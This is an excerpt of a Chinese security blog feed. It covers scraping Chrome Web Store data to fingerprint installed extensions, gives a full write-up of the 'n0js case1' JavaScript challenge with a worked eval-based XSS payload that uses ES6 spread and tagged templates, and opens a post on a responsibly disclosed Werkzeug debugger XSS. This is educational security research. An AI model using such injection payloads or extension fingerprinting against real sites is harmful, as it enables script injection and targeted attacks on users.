<li>爬取chrome扩展信息：<a href="https://chrome.google.com/webstore/ajax/item?hl=zh-CN&amp;gl=CN&amp;pv=20161108&amp;mce=atf,eed,pii,rtr,rlb,gtc,hcn,svp,wtd,c3d,ncr,ctm,ac,hot,euf,mac,fcf,rma,pot,evt,igb&amp;requestedCounts=infiniteWall:{limit}:0:false&amp;token=featured:0@10316222:7:false,mcol#top_picks_productivity:0@10316223:11:true,infiniteWall:0@10316253:{start}:false&amp;category={category}&amp;_reqid=3058318&amp;rt=j" target="_blank" rel="external">https://chrome.google.com/webstore/ajax/item?hl=zh-CN&amp;gl=CN&amp;pv=20161108&amp;mce=atf,eed,pii,rtr,rlb,gtc,hcn,svp,wtd,c3d,ncr,ctm,ac,hot,euf,mac,fcf,rma,pot,evt,igb&amp;requestedCounts=infiniteWall:{limit}:0:false&amp;token=featured:0@10316222:7:false,mcol#top_picks_productivity:0@10316223:11:true,infiniteWall:0@10316253:{start}:false&amp;category={category}&amp;_reqid=3058318&amp;rt=j</a></li>
<li>根据ID下载<code>.crx</code>文件：<a href="https://clients2.google.com/service/update2/crx?response=redirect&amp;prodversion=49.0&amp;x=id%3D{id}%26installsource%3Dondemand%26uc" target="_blank" rel="external">https://clients2.google.com/service/update2/crx?response=redirect&amp;prodversion=49.0&amp;x=id%3D{id}%26installsource%3Dondemand%26uc</a></li>
</ol>
<p>下载crx文件是比较简单的，主要是爬取chrome扩展信息的那个API，费了我和蘑菇一点神。主要看url中，我{}出来的start和limit的位置是比较奇特的，不像正常的翻页请求，根据start，limit和category可以获取到全部的chrome扩展信息。扩展的分类有：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">category_list = [</span><br><span class="line">    <span class="string">'ext/10-blogging'</span>,</span><br><span class="line">    <span class="string">'ext/12-shopping'</span>,</span><br><span class="line">    <span class="string">'ext/11-web-development'</span>,</span><br><span class="line">    <span class="string">'ext/1-communication'</span>,</span><br><span class="line">    <span class="string">'ext/7-productivity'</span>,</span><br><span class="line">    <span class="string">'ext/38-search-tools'</span>,</span><br><span class="line">    <span class="string">'ext/13-sports'</span>,</span><br><span class="line">    <span class="string">'ext/22-accessibility'</span>,</span><br><span class="line">    <span class="string">'ext/6-news'</span>,</span><br><span class="line">    <span class="string">'ext/14-fun'</span>,</span><br><span class="line">    <span class="string">'ext/28-photos'</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>其实还有一个’ext/15-by-google’分类，但是这个分类的扩展在其他分类中也存在，而且这个分类是不能用第一个Api爬去的，得使用<code>https://chrome.google.com/webstore/ajax/item?pv=20161108&amp;count=209&amp;category=ext/15-by-google</code>这个API。API中存在的pv可能是需要更新的。</p>
<h3 id="2-_拓展数据解析">2. 拓展数据解析</h3><p>一般这种ajax，返回的应该是正常的json格式，但是Chrome Webstore却不是，Chrome返回的的格式是这样的。</p>
<p><img src="http://ww2.sinaimg.cn/large/005y7Ba5gw1fbkvardvdgj31kw0sjhdt.jpg" alt=""></p>
<p>明显不是正常的json，经过测试之后，是可以根据这样<code>json.loads(res.lstrip(&quot;)]}&#39;\n&quot;))</code>解析成一个复杂的list的。然后再根据位置进行提取可以获得到我们所需的信息。其中要注意，users的信息是千分位字符串<code>1,000,000</code>，而且是有可能出现<code>1,000,000+</code>的情况，在处理数据的时候需要考虑进来。处理方法看<code>https://github.com/neargle/ChromeExtensionKnower/blob/master/lib/common.py#L8</code>。</p>
<h3 id="3-_解析”web_accessible_resources”">3. 解析”web_accessible_resources”</h3><p>我们需要<code>web_accessible_resources</code>中可以访问的资源，原本直接使用<code>web_accessible_resources</code>，但是发现<code>web_accessible_resources</code>中是可以使用<code>*</code>做通配符的，所以我们需要获取crx中的所有文件路径对通配符进行匹配。但是与linux通配符又有一定区别。<code>/path/*</code>是可以匹配到<code>path/zzz.png</code>的，所以如果要使用<code>fnmatch</code>进行处理的话，多进行一个对路径和通配符的操作。</p>
<p>实际编写脚本的过程中，因为这些问题得爬取数据下来观察数据才能发现不对，所以重复爬了好几次。浪费了很多时间。</p>
<p>还有一些小细节，比较繁琐就不描述了，有需要的可以看看项目代码。</p>
<h2 id="程序使用介绍">程序使用介绍</h2><p><a href="https://github.com/neargle/ChromeExtensionKnower/blob/master/README.md" target="_blank" rel="external">https://github.com/neargle/ChromeExtensionKnower/blob/master/README.md</a></p>
<h2 id="最后">最后</h2><p>因为chrome插件开发者的质量层次不齐，不免还有很多未解决的问题。包括其最后的Poc的JavaScript中也留了一个很有趣的点，注意到并且对此有想法的人可以和我们交流呀。</p>
<h2 id="Thx">Thx</h2><p>Evi1m0 Phithon</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;可以先看一下n0r00t的文章的这一篇:&lt;a href=&quot;https://www.n0tr00t.com/2017/01/09/Chrome-Extensions-Probe.html&quot;&gt;https://www.n0tr00t.com/2017/01/09/Chrome-Extensions-Probe.html&lt;/a&gt;。&lt;br&gt;以及用chrome试用一下最后的成果POC:&lt;a href=&quot;http://server.n0tr00t.com/chrome/ext_probe.html&quot;&gt;http://server.n0tr00t.com/chrome/ext_probe.html&lt;/a&gt;，可以探测Chrome中已安装的扩展，配合Chrome扩展的一些漏洞，说不定能达到定点攻击的效果。&lt;br&gt;
    
    </summary>
    
    
      <category term="安全研究" scheme="http://blog.neargle.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>n0js case1 writeup</title>
    <link href="http://blog.neargle.com/2016/12/15/n0js-case1-writeup/"/>
    <id>http://blog.neargle.com/2016/12/15/n0js-case1-writeup/</id>
    <published>2016-12-15T07:46:50.000Z</published>
    <updated>2016-12-15T09:31:27.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>跟着蘑菇老师学前端安全第一弹[二哈]</em></p>
<p>地址：</p>
<p><a href="http://server.n0tr00t.com/n0js/case1.html" target="_blank" rel="external">http://server.n0tr00t.com/n0js/case1.html</a></p>
<p>主要代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">a1, a2, a3</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;a1&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">`<span class="subst">$&#123;a2&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.warn(<span class="string">`<span class="subst">$&#123;a3&#125;</span>`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> x = location.hash;</span><br><span class="line">l1 = <span class="built_in">escape</span>(x.split(<span class="string">'#'</span>)[<span class="number">1</span>]);</span><br><span class="line">l2 = x.split(<span class="string">'#'</span>)[<span class="number">2</span>];</span><br><span class="line">l3 = x.split(<span class="string">'#'</span>)[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">if</span> (l1 === <span class="string">'undefined'</span> || l1.length &gt;= <span class="number">30</span>) &#123;</span><br><span class="line">    a1</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (l2 === <span class="string">'undefined'</span> || l2.length &gt;= <span class="number">35</span>) &#123;</span><br><span class="line">    a2</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> v = [<span class="string">'1'</span>, l2, <span class="string">'3'</span>];</span><br><span class="line"><span class="keyword">if</span> (l1.indexOf(<span class="string">';'</span>) &gt;= <span class="number">0</span> || l2.indexOf(<span class="string">'('</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    a3</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (l2.indexOf(<span class="string">'/'</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    b1</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (l3.indexOf(<span class="string">']'</span>) &gt;= <span class="number">0</span> || l3.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">    c3</span><br><span class="line">&#125;; &#123;</span><br><span class="line">    d = l1 + <span class="string">'v'</span> + l3.trim();</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'test('</span> + d + <span class="string">')'</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="解题过程">解题过程</h1><p>查看页面源码可以看到我们需要分析的js。</p>
<h3 id="代码分析">代码分析</h3><p>做类似的题目第一步都是要理清js的逻辑。这一次的题目可以把代码分为四部分来看。</p>
<p>I. test函数定义：第二个参数a2传入eval执行，可能就是我们要利用的点<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">a1, a2, a3</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;a1&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">`<span class="subst">$&#123;a2&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.warn(<span class="string">`<span class="subst">$&#123;a3&#125;</span>`</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>II. 获取hash生成变量进行处理,第一个变量l1进行了escape编码，会转化为unicode编码值,因此不能包含部分特殊符号<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = location.hash;</span><br><span class="line">l1 = <span class="built_in">escape</span>(x.split(<span class="string">'#'</span>)[<span class="number">1</span>]);</span><br><span class="line">l2 = x.split(<span class="string">'#'</span>)[<span class="number">2</span>];</span><br><span class="line">l3 = x.split(<span class="string">'#'</span>)[<span class="number">3</span>];</span><br></pre></td></tr></table></figure></p>
<p>III. 第三部分算是过滤，如果执行到判断体中的未定义变量，js就不能往下执行了。所以不能使任意一个条件满足。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l1 === <span class="string">'undefined'</span> || l1.length &gt;= <span class="number">30</span>) &#123;</span><br><span class="line">    <span class="comment">// 第一个hash不得为空，限制payload长度小于30</span></span><br><span class="line">    a1</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (l2 === <span class="string">'undefined'</span> || l2.length &gt;= <span class="number">35</span>) &#123;</span><br><span class="line">    <span class="comment">// 第二个hash不得为空，限制payload长度小于35</span></span><br><span class="line">    a2</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (l1.indexOf(<span class="string">';'</span>) &gt;= <span class="number">0</span> || l2.indexOf(<span class="string">'('</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 第一个hash内不得有';'和'('</span></span><br><span class="line">    a3</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (l2.indexOf(<span class="string">'/'</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 第二个hash不得有'/'</span></span><br><span class="line">    b1</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (l3.indexOf(<span class="string">']'</span>) &gt;= <span class="number">0</span> || l3.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">// 第三个哈希是只能有一个字符而且不得为']'</span></span><br><span class="line">    c3</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>IV. 主要考察点，把第二个hash放入数组v的第二个元素，前后拼接另外两个hash字符串传入test函数中。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> v = [<span class="string">'1'</span>, l2, <span class="string">'3'</span>];</span><br><span class="line">&#123;</span><br><span class="line">    d = l1 + <span class="string">'v'</span> + l3.trim();</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'test('</span> + d + <span class="string">')'</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h1 id="思路">思路</h1><p>这里主要考察如何把payload放到test的第二个参数里去执行。</p>
<p>我原先构造了： #2+#prompt(1)#，想利用 2 + [1,’prompt(1)’, 3] = “21,prompt(1),3” 的方式把逗号带入eval中。</p>
<p><img src="http://ww4.sinaimg.cn/large/005y7Ba5gw1farkq05vg5j30rk02ugls.jpg" alt=""></p>
<p>但是这里最后的拼接<code>d = l1 + &#39;v&#39; + l3.trim();</code>使用的是<code>&#39;v&#39;</code>而不是<code>v</code>。所以整个字符串连同逗号一起被传入了test的第一个参数中,压根就影响不到第二个参数。</p>
<p><img src="http://ww4.sinaimg.cn/large/005y7Ba5gw1farkvua9ijj31kw0ifgtk.jpg" alt=""></p>
<p>思考了很久都没有很好地办法给第二个参数赋值。</p>
<p>后来开始翻ES6文档，蘑菇说ES6这个方向是对的，就认真的翻了几个新特性。</p>
<p>翻了很久，看到了这个:<br><a href="https://leanpub.com/understandinges6/read#leanpub-auto-the-spread-operator" target="_blank" rel="external">https://leanpub.com/understandinges6/read#leanpub-auto-the-spread-operator</a></p>
<p>理清楚代码逻辑我们知道最尾部执行的eval其实是这样的<code>eval(&#39;test(&#39;+&#39;第一个hash:l1&#39;+&#39;v&#39;+&#39;第三个hash:l3&#39;)&#39;);</code>,v是一个数组，该数组中第二个元素受到第二个hash:l2控制，刚好test的第二个参数被直接传入eval内进行执行。上面提到的ES6特性，可以把一个数组中的元素分发到函数的多个参数中。</p>
<p>例如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;a&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.info(<span class="string">`<span class="subst">$&#123;b&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.warn(<span class="string">`<span class="subst">$&#123;c&#125;</span>`</span>);</span><br><span class="line">&#125;;</span><br><span class="line">str_list = [<span class="string">'log'</span>,<span class="string">'info'</span>,<span class="string">'warn'</span>];</span><br><span class="line">log(...str_list)</span><br></pre></td></tr></table></figure>
<p>结果如:</p>
<p><img src="http://ww3.sinaimg.cn/large/005y7Ba5gw1fariqx8fd4j30xy0byaby.jpg" alt=""></p>
<p>其实这个特性在其他语言中也很常见，例如在python中：</p>
<p><img src="http://ww3.sinaimg.cn/large/005y7Ba5gw1farirp3ddgj30xg08e0ux.jpg" alt=""></p>
<p>再回到我们的n0js-case1中来，很显然我们可以构造<code>test(...v)</code>使我们没有经过编码的l2带着我们所需的payload进入test函数内的eval执行。只需把第一个hash设置为<code>...</code>即可。escape会把除了ASCII字母、数字、标点符号”@ * _ + - . /“以外的字符进行编码。显然<code>.</code>是不会被编码的。</p>
<p><img src="http://ww4.sinaimg.cn/large/005y7Ba5gw1farj2bnb10j316s0k2gq0.jpg" alt=""></p>
<p>这里还有一点，l2不允许含有括号’(‘。可以使用ES6的另一个特性，使用function_name``代替functon_name().</p>
<p><img src="http://ww4.sinaimg.cn/large/005y7Ba5gw1farity5601j30zi0e2tau.jpg" alt=""></p>
<p>因此可以构造最后的payload：</p>
<p><a href="http://server.n0tr00t.com/n0js/case1.html#...#prompt`1`#" target="_blank" rel="external">http://server.n0tr00t.com/n0js/case1.html#...#prompt`1`#</a></p>
<h1 id="最后">最后</h1><p>好吧第三个hash确实没有用到。出题人说第三个hash是为了给各位做题的留空间，看看能不能激发出新的解题方式。嗯这个解释不错，但是为什么我手中的菜刀就是在闪闪发光呢？</p>
<p>我最初还想在最下面的eval直接构造prompt执行，不经过test函数内的eval。但是失败了2333</p>
<p>ps. 新一期的[n0js] case2已经开始了，据说上一次蘑菇同学守着邮箱很久没有人解出来，心中很失落。这一次也很有趣，欢迎来玩啊。url：<a href="http://server.n0tr00t.com/n0js/case2.html" target="_blank" rel="external">http://server.n0tr00t.com/n0js/case2.html</a> 。</p>
<p>ps. 看到ES6扩展运算符和python特性的朋友们是否会想到最近pwnhub史上第一道web题里的’func(**{key:value})’呢？虽然不是一样的题目却是相似的特性。这些新特性在方便开发者的同时，增加程序灵活性的同时，也会产生新的安全问题，想必也是更加有趣的安全研究方向。</p>
<p>再ps. 上一次解出来之后，我就把所看的ES6文档放到了 <a href="http://wiki.ioin.in/" target="_blank" rel="external">http://wiki.ioin.in/</a> 上，这次做不出来为什么不翻翻Sec-News呢？</p>
<p>(连着给你们打三个广告我容易吗？)</p>
<!-- eval('test(21,1,2);prompt`1`,3')
1 + [1,2,3] + 3 = "11,2,33"
`/case1%20-%20n0js.html#2+#);prompt`1`#`
2+['1',')prompt`1`','3']
21,'prompt`1`',3
test(21,prompt`1`,3)

http://cookfront.github.io/2015/06/06/es6-function/#扩展运算符
`http://server.n0tr00t.com/n0js/case1.html#...#prompt`1`#` -->
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;em&gt;跟着蘑菇老师学前端安全第一弹[二哈]&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://server.n0tr00t.com/n0js/case1.html&quot;&gt;http://server.n0tr00t.com/n0js/case1.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;主要代码：&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;test&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;a1, a2, a3&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;`&lt;span class=&quot;subst&quot;&gt;$&amp;#123;a1&amp;#125;&lt;/span&gt;`&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;eval&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;`&lt;span class=&quot;subst&quot;&gt;$&amp;#123;a2&amp;#125;&lt;/span&gt;`&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.warn(&lt;span class=&quot;string&quot;&gt;`&lt;span class=&quot;subst&quot;&gt;$&amp;#123;a3&amp;#125;&lt;/span&gt;`&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; x = location.hash;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;l1 = &lt;span class=&quot;built_in&quot;&gt;escape&lt;/span&gt;(x.split(&lt;span class=&quot;string&quot;&gt;&#39;#&#39;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;l2 = x.split(&lt;span class=&quot;string&quot;&gt;&#39;#&#39;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;l3 = x.split(&lt;span class=&quot;string&quot;&gt;&#39;#&#39;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (l1 === &lt;span class=&quot;string&quot;&gt;&#39;undefined&#39;&lt;/span&gt; || l1.length &amp;gt;= &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    a1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (l2 === &lt;span class=&quot;string&quot;&gt;&#39;undefined&#39;&lt;/span&gt; || l2.length &amp;gt;= &lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    a2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; v = [&lt;span class=&quot;string&quot;&gt;&#39;1&#39;&lt;/span&gt;, l2, &lt;span class=&quot;string&quot;&gt;&#39;3&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (l1.indexOf(&lt;span class=&quot;string&quot;&gt;&#39;;&#39;&lt;/span&gt;) &amp;gt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; || l2.indexOf(&lt;span class=&quot;string&quot;&gt;&#39;(&#39;&lt;/span&gt;) &amp;gt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    a3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (l2.indexOf(&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;) &amp;gt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    b1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (l3.indexOf(&lt;span class=&quot;string&quot;&gt;&#39;]&#39;&lt;/span&gt;) &amp;gt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; || l3.length &amp;gt;= &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    c3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    d = l1 + &lt;span class=&quot;string&quot;&gt;&#39;v&#39;&lt;/span&gt; + l3.trim();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;eval&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;test(&#39;&lt;/span&gt; + d + &lt;span class=&quot;string&quot;&gt;&#39;)&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="前端安全" scheme="http://blog.neargle.com/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Flask Debugger页面上的通用XSS漏洞分析和挖掘过程记录</title>
    <link href="http://blog.neargle.com/2016/09/21/flask-src-review-get-a-xss-from-debuger/"/>
    <id>http://blog.neargle.com/2016/09/21/flask-src-review-get-a-xss-from-debuger/</id>
    <published>2016-09-21T01:48:42.000Z</published>
    <updated>2017-02-15T03:47:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p><img src="http://ww3.sinaimg.cn/large/005y7Ba5jw1f81cs6bp5lj31130httgm.jpg" alt=""><br>前段时间发现较为鸡肋的洞和当时写的文章。</p>
<p>一个存在于Flask框架Debugger页面上的通用XSS，Werkzeug0.10.10之前版本受影响，已经报告给Flask官方并提交修复代码。官方在确认之后，及时发布了0.10.11。</p>
<p>记下了发现的过程。</p>
<a id="more"></a>
<h1 id="正文">正文</h1><p>看了一段时间Flask的源码，想学习一下项目架构和一些感兴趣的实现，其中就包括Flask功能强大的Debugger页面。用过Flask的人都知道，Flask的Debug模式能帮助我们在开发Web应用时跟踪异常信息，调试代码，解决问题。</p>
<p>在使用Debugger的时候，我就在想这个页面难道也是使用<code>render_template</code>或其他Flask模板调用函数生成的吗？稍微翻了一下代码，发现这个功能既没有使用Jinja2模板，甚至它的主要代码写在Flask的另一个基础库werkzeug上面。</p>
<p><a href="https://github.com/pallets/werkzeug" target="_blank" rel="external">Werkzeug</a>是Flask官方开发的一个WSGI工具箱，可以作为一个Web框架的底层库。事实上Flask就是基于Werkzeug和Jinja2开发的一个Web框架。</p>
